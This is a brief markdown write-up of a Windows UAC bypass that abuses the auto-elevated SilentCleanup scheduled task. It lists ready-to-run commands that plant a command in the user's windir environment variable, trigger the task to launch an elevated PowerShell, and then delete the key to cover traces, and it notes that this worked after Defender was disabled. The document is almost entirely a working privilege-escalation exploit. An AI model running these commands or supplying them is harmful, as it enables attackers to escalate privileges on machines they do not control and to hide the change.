# Silent Cleanup Task
Silent Cleanup is an auto-elevated task located at `%windir%\system32\cleanmgr.exe`

### Adding Registry Keys
```CMD
reg add "HKCU\Environment" /v "windir" /d "cmd /c start powershell&REM " >nul
```

### Running Silent Cleanup
```CMD
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul
```

### Cleaning Up
```CMD
reg delete "HKCU\Environment" /v "windir" /F
```

### Notes
- Defender blocks the user from running SilentCleanup
- Worked on Windows 10 Pro N 21H2 Build 19044.1288 after disabling Defender.